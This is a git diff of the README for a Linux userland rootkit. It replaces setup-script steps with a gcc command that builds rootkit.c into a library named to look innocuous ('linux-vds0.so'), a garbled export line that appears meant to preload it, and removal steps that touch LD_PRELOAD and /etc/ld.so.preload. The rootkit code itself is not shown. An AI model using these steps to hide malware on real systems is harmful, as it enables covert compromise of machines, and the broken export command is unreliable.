@@ -1,4 +1,4 @@
-# lurker userland rootkit
+# userland rootkit
 
 ### my specs:
 *Void Linux PC:*
@@ -13,14 +13,14 @@
     <li>clang version 13.0.0</li>
 </ul>
 
-# compile and run rootkit:
+# compile and load library:
 ```
-chmod u=rwx setup.sh
-./setup.sh --export
+gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl
+export $(pwd)/linux-vds0.so 
 ```
 
-# delete and unload rootkit:
+# delete and unload library:
 ```
-chmod u=rwx setup.sh
-./setup.sh --remove
+unset LD_PRELOAD
+sudo rm /etc/ld.so.preload 
 ```
